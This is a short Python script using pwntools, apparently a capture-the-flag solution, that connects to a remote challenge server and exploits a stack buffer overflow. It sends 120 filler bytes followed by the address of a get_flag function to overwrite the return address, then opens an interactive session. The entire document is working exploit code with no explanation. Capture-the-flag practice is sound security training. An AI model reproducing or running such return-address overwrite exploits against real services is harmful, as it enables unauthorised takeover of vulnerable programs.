from pwn import *

host = "forever.isss.io"
port = 1303

p = remote(host, port)

get_flag = 0x4011c7

response = p.recvuntil("now!")
print(response.decode())
p.sendline(b"A" * 120 + p64(get_flag))
p.interactive()
